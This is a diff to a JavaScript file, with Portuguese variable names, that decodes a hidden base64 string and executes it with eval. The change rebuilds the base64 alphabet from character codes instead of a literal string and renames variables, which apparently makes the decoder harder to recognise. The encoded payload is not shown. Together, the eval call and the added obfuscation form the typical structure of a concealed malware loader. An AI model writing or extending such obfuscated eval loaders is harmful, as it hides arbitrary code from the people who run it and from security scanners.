@@ -11,43 +11,72 @@ var xotaX = getampas63mais1(viniciusDavid);
 eval(xotaX);
 
 function getampas63mais1(stringSuja) {
-    var base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    var letrasMaiusculas = [];
+
+    for (i = 65; i <= 90; i++) {
+        letrasMaiusculas.push(i);
+    }
+
+    var letrasMinusculas = [];
+
+    for (i = 97; i <= 122; i++) {
+        letrasMinusculas.push(i);
+    }
+
+    var numeros = [];
+
+    for (i = 48; i <= 57; i++) {
+        numeros.push(i);
+    }
+
+    var simbolos = [43, 47];
+
+    var maluquice = letrasMaiusculas.concat(letrasMinusculas);
+
+    var tabelaFullInts = maluquice.concat(numeros, simbolos);
+
+    var tabelaFull = [];
+
+    for (i = 0; i < tabelaFullInts.length; i++) {
+        tabelaFull.push(String.fromCharCode(tabelaFullInts[i]));
+    }
+
     var in_len = stringSuja.length;
     var i = 0;
     var j = 0;
     var in_ = 0;
-    var char_array_4 = [0, 0, 0, 0];
-    var char_array_3 = [0, 0, 0];
+    var listade4 = [0, 0, 0, 0];
+    var listade3 = [0, 0, 0];
     var ret = [];
 
     while (in_len-- && (stringSuja[in_] != '=')) {
-        char_array_4[i++] = stringSuja[in_]; in_++;
+        listade4[i++] = stringSuja[in_]; in_++;
         if (i == 4) {
             for (i = 0; i < 4; i++)
-                char_array_4[i] = base64_chars.search(char_array_4[i]);
+                listade4[i] = tabelaFull.join("").search(listade4[i]);
 
-            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+            listade3[0] = (listade4[0] << 2) + ((listade4[1] & 0x30) >> 4);
+            listade3[1] = ((listade4[1] & 0xf) << 4) + ((listade4[2] & 0x3c) >> 2);
+            listade3[2] = ((listade4[2] & 0x3) << 6) + listade4[3];
 
             for (i = 0; (i < 3); i++)
-                ret.push(char_array_3[i]);
+                ret.push(listade3[i]);
             i = 0;
         }
     }
 
     if (i) {
         for (j = i; j < 4; j++)
-            char_array_4[j] = 0;
+            listade4[j] = 0;
 
         for (j = 0; j < 4; j++)
-            char_array_4[j] = base64_chars.search(char_array_4[j]);
+            listade4[j] = tabelaFull.join("").search(listade4[j]);
 
-        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+        listade3[0] = (listade4[0] << 2) + ((listade4[1] & 0x30) >> 4);
+        listade3[1] = ((listade4[1] & 0xf) << 4) + ((listade4[2] & 0x3c) >> 2);
+        listade3[2] = ((listade4[2] & 0x3) << 6) + listade4[3];
 
-        for (j = 0; (j < i - 1); j++) ret.push(char_array_3[j]);
+        for (j = 0; (j < i - 1); j++) ret.push(listade3[j]);
     }
 
     return suckData(ret).join("");
